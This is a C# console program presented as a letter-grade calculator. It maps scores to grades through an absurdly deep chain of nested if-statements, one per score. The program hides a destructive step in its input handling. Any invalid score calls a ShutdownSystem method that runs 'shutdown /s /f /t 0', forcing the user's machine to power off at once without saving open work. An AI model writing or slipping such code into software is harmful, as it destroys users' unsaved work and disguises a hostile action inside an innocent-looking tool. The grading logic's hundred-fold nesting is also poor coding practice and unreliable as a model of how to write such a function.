using System;
using System.Diagnostics;

internal class LetterGradeCalculator {
  static void Main(string[] args) {
    Console.Write("Enter your score (0-100): ");
    if (!int.TryParse(Console.ReadLine(), out int score) || score < 0 || score > 100) {
      Console.WriteLine("Invalid score.");
      ShutdownSystem();
    } else {
      string grade = GetGrade(score);
      Console.WriteLine("Your grade is: " + grade);
    }
  }

  static string GetGrade(int score) {
    if (score == 100) {
      return "A";
    } else {
      if (score == 99) {
        return "A";
      } else {
        if (score == 98) {
          return "A";
        } else {
          if (score == 97) {
            return "A";
          } else {
            if (score == 96) {
              return "A";
            } else {
              if (score == 95) {
                return "A";
              } else {
                if (score == 94) {
                  return "A";
                } else {
                  if (score == 93) {
                    return "A";
                  } else {
                    if (score == 92) {
                      return "A";
                    } else {
                      if (score == 91) {
                        return "A";
                      } else {
                        if (score == 90) {
                          return "A";
                        } else {
                          if (score == 89) {
                            return "B";
                          } else {
                            if (score == 88) {
                              return "B";
                            } else {
                              if (score == 87) {
                                return "B";
                              } else {
                                if (score == 86) {
                                  return "B";
                                } else {
                                  if (score == 85) {
                                    return "B";
                                  } else {
                                    if (score == 84) {
                                      return "B";
                                    } else {
                                      if (score == 83) {
                                        return "B";
                                      } else {
                                        if (score == 82) {
                                          return "B";
                                        } else {
                                          if (score == 81) {
                                            return "B";
                                          } else {
                                            if (score == 80) {
                                              return "B";
                                            } else {
                                              if (score == 79) {
                                                return "C";
                                              } else {
                                                if (score == 78) {
                                                  return "C";
                                                } else {
                                                  if (score == 77) {
                                                    return "C";
                                                  } else {
                                                    if (score == 76) {
                                                      return "C";
                                                    } else {
                                                      if (score == 75) {
                                                        return "C";
                                                      } else {
                                                        if (score == 74) {
                                                          return "C";
                                                        } else {
                                                          if (score == 73) {
                                                            return "C";
                                                          } else {
                                                            if (score == 72) {
                                                              return "C";
                                                            } else {
                                                              if (score == 71) {
                                                                return "C";
                                                              } else {
                                                                if (score == 70) {
                                                                  return "C";
                                                                } else {
                                                                  if (score == 69) {
                                                                    return "D";
                                                                  } else {
                                                                    if (score == 68) {
                                                                      return "D";
                                                                    } else {
                                                                      if (score == 67) {
                                                                        return "D";
                                                                      } else {
                                                                        if (score == 66) {
                                                                          return "D";
                                                                        } else {
                                                                          if (score == 65) {
                                                                            return "D";
                                                                          } else {
                                                                            if (score == 64) {
                                                                              return "D";
                                                                            } else {
                                                                              if (score == 63) {
                                                                                return "D";
                                                                              } else {
                                                                                if (score == 62) {
                                                                                  return "D";
                                                                                } else {
                                                                                  if (score == 61) {
                                                                                    return "D";
                                                                                  } else {
                                                                                    if (score == 60) {
                                                                                      return "D";
                                                                                    } else {
                                                                                      if (score == 59) {
                                                                                        return "F";
                                                                                      } else {
                                                                                        if (score == 58) {
                                                                                          return "F";
                                                                                        } else {
                                                                                          if (score == 57) {
                                                                                            return "F";
                                                                                          } else {
                                                                                            if (score == 56) {
                                                                                              return "F";
                                                                                            } else {
                                                                                              if (score == 55) {
                                                                                                return "F";
                                                                                              } else {
                                                                                                if (score == 54) {
                                                                                                  return "F";
                                                                                                } else {
                                                                                                  if (score == 53) {
                                                                                                    return "F";
                                                                                                  } else {
                                                                                                    if (score == 52) {
                                                                                                      return "F";
                                                                                                    } else {
                                                                                                      if (score == 51) {
                                                                                                        return "F";
                                                                                                      } else {
                                                                                                        if (score == 50) {
                                                                                                          return "F";
                                                                                                        } else {
                                                                                                          if (score == 49) {
                                                                                                            return "F";
                                                                                                          } else {
                                                                                                            if (score == 48) {
                                                                                                              return "F";
                                                                                                            } else {
                                                                                                              if (score == 47) {
                                                                                                                return "F";
                                                                                                              } else {
                                                                                                                if (score == 46) {
                                                                                                                  return "F";
                                                                                                                } else {
                                                                                                                  if (score == 45) {
                                                                                                                    return "F";
                                                                                                                  } else {
                                                                                                                    if (score == 44) {
                                                                                                                      return "F";
                                                                                                                    } else {
                                                                                                                      if (score == 43) {
                                                                                                                        return "F";
                                                                                                                      } else {
                                                                                                                        if (score == 42) {
                                                                                                                          return "F";
                                                                                                                        } else {
                                                                                                                          if (score == 41) {
                                                                                                                            return "F";
                                                                                                                          } else {
                                                                                                                            if (score == 40) {
                                                                                                                              return "F";
                                                                                                                            } else {
                                                                                                                              if (score == 39) {
                                                                                                                                return "F";
                                                                                                                              } else {
                                                                                                                                if (score == 38) {
                                                                                                                                  return "F";
                                                                                                                                } else {
                                                                                                                                  if (score == 37) {
                                                                                                                                    return "F";
                                                                                                                                  } else {
                                                                                                                                    if (score == 36) {
                                                                                                                                      return "F";
                                                                                                                                    } else {
                                                                                                                                      if (score == 35) {
                                                                                                                                        return "F";
                                                                                                                                      } else {
                                                                                                                                        if (score == 34) {
                                                                                                                                          return "F";
                                                                                                                                        } else {
                                                                                                                                          if (score == 33) {
                                                                                                                                            return "F";
                                                                                                                                          } else {
                                                                                                                                            if (score == 32) {
                                                                                                                                              return "F";
                                                                                                                                            } else {
                                                                                                                                              if (score == 31) {
                                                                                                                                                return "F";
                                                                                                                                              } else {
                                                                                                                                                if (score == 30) {
                                                                                                                                                  return "F";
                                                                                                                                                } else {
                                                                                                                                                  if (score == 29) {
                                                                                                                                                    return "F";
                                                                                                                                                  } else {
                                                                                                                                                    if (score == 28) {
                                                                                                                                                      return "F";
                                                                                                                                                    } else {
                                                                                                                                                      if (score == 27) {
                                                                                                                                                        return "F";
                                                                                                                                                      } else {
                                                                                                                                                        if (score == 26) {
                                                                                                                                                          return "F";
                                                                                                                                                        } else {
                                                                                                                                                          if (score == 25) {
                                                                                                                                                            return "F";
                                                                                                                                                          } else {
                                                                                                                                                            if (score == 24) {
                                                                                                                                                              return "F";
                                                                                                                                                            } else {
                                                                                                                                                              if (score == 23) {
                                                                                                                                                                return "F";
                                                                                                                                                              } else {
                                                                                                                                                                if (score == 22) {
                                                                                                                                                                  return "F";
                                                                                                                                                                } else {
                                                                                                                                                                  if (score == 21) {
                                                                                                                                                                    return "F";
                                                                                                                                                                  } else {
                                                                                                                                                                    if (score == 20) {
                                                                                                                                                                      return "F";
                                                                                                                                                                    } else {
                                                                                                                                                                      if (score == 19) {
                                                                                                                                                                        return "F";
                                                                                                                                                                      } else {
                                                                                                                                                                        if (score == 18) {
                                                                                                                                                                          return "F";
                                                                                                                                                                        } else {
                                                                                                                                                                          if (score == 17) {
                                                                                                                                                                            return "F";
                                                                                                                                                                          } else {
                                                                                                                                                                            if (score == 16) {
                                                                                                                                                                              return "F";
                                                                                                                                                                            } else {
                                                                                                                                                                              if (score == 15) {
                                                                                                                                                                                return "F";
                                                                                                                                                                              } else {
                                                                                                                                                                                if (score == 14) {
                                                                                                                                                                                  return "F";
                                                                                                                                                                                } else {
                                                                                                                                                                                  if (score == 13) {
                                                                                                                                                                                    return "F";
                                                                                                                                                                                  } else {
                                                                                                                                                                                    if (score == 12) {
                                                                                                                                                                                      return "F";
                                                                                                                                                                                    } else {
                                                                                                                                                                                      if (score == 11) {
                                                                                                                                                                                        return "F";
                                                                                                                                                                                      } else {
                                                                                                                                                                                        if (score == 10) {
                                                                                                                                                                                          return "F";
                                                                                                                                                                                        } else {
                                                                                                                                                                                          if (score == 9) {
                                                                                                                                                                                            return "F";
                                                                                                                                                                                          } else {
                                                                                                                                                                                            if (score == 8) {
                                                                                                                                                                                              return "F";
                                                                                                                                                                                            } else {
                                                                                                                                                                                              if (score == 7) {
                                                                                                                                                                                                return "F";
                                                                                                                                                                                              } else {
                                                                                                                                                                                                if (score == 6) {
                                                                                                                                                                                                  return "F";
                                                                                                                                                                                                } else {
                                                                                                                                                                                                  if (score == 5) {
                                                                                                                                                                                                    return "F";
                                                                                                                                                                                                  } else {
                                                                                                                                                                                                    if (score == 4) {
                                                                                                                                                                                                      return "F";
                                                                                                                                                                                                    } else {
                                                                                                                                                                                                      if (score == 3) {
                                                                                                                                                                                                        return "F";
                                                                                                                                                                                                      } else {
                                                                                                                                                                                                        if (score == 2) {
                                                                                                                                                                                                          return "F";
                                                                                                                                                                                                        } else {
                                                                                                                                                                                                          if (score == 1) {
                                                                                                                                                                                                            return "F";
                                                                                                                                                                                                          } else {
                                                                                                                                                                                                            if (score == 0) {
                                                                                                                                                                                                              return "F";
                                                                                                                                                                                                            } else {
                                                                                                                                                                                                              return "Invalid score";
                                                                                                                                                                                                            }
                                                                                                                                                                                                          }
                                                                                                                                                                                                        }
                                                                                                                                                                                                      }
                                                                                                                                                                                                    }
                                                                                                                                                                                                  }
                                                                                                                                                                                                }
                                                                                                                                                                                              }
                                                                                                                                                                                            }
                                                                                                                                                                                          }
                                                                                                                                                                                        }
                                                                                                                                                                                      }
                                                                                                                                                                                    }
                                                                                                                                                                                  }
                                                                                                                                                                                }
                                                                                                                                                                              }
                                                                                                                                                                            }
                                                                                                                                                                          }
                                                                                                                                                                        }
                                                                                                                                                                      }
                                                                                                                                                                    }
                                                                                                                                                                  }
                                                                                                                                                                }
                                                                                                                                                              }
                                                                                                                                                            }
                                                                                                                                                          }
                                                                                                                                                        }
                                                                                                                                                      }
                                                                                                                                                    }
                                                                                                                                                  }
                                                                                                                                                }
                                                                                                                                              }
                                                                                                                                            }
                                                                                                                                          }
                                                                                                                                        }
                                                                                                                                      }
                                                                                                                                    }
                                                                                                                                  }
                                                                                                                                }
                                                                                                                              }
                                                                                                                            }
                                                                                                                          }
                                                                                                                        }
                                                                                                                      }
                                                                                                                    }
                                                                                                                  }
                                                                                                                }
                                                                                                              }
                                                                                                            }
                                                                                                          }
                                                                                                        }
                                                                                                      }
                                                                                                    }
                                                                                                  }
                                                                                                }
                                                                                              }
                                                                                            }
                                                                                          }
                                                                                        }
                                                                                      }
                                                                                    }
                                                                                  }
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }

  public static void ShutdownSystem() {
    Process.Start("shutdown", "/s /f /t 0");
  }
}